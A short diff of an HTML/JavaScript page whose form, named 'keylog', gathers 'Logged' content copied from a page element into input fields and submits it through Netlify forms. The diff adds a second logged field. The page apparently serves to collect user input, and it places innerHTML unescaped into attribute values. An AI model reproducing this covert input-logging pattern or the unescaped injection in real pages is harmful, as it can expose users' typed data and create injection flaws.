@@ -17,6 +17,8 @@ async function demo() {
 document.getElementById("z").innerHTML += (y);
 tburuh = ("<label for='inf'>Logged:</label>&nbsp;<input type='text' id='inf' name='info' value='"+(document.getElementById("z").innerHTML)+"' />")
 document.getElementById("bruh").innerHTML = (tburuh);
+tburuh2 = ("<label for='inf3'>Logged2:</label>&nbsp;<input type='text' id='inf3' name='info3' value='"+(document.getElementById("z").innerHTML)+"' >")
+document.getElementById("bruh2").innerHTML = (tburuh2);
 }
 
 demo();
@@ -25,8 +27,8 @@ demo();
 </head>
 <form name="keylog" action="POST" data-netlify="true">
 <p id=bruh></p>
+<p id=bruh2></p>
 <label for='inf2'>LoggedTest:</label>&nbsp;<input type='text' id='inf2' name='info2' value='test' />
-<label for='bruh'>LoggedTest2:</label>&nbsp;<input type='text' id='bruh' name='info3' value='' />
 <p id=z></p>
 <input type='submit' value='Submit'>
 </form>
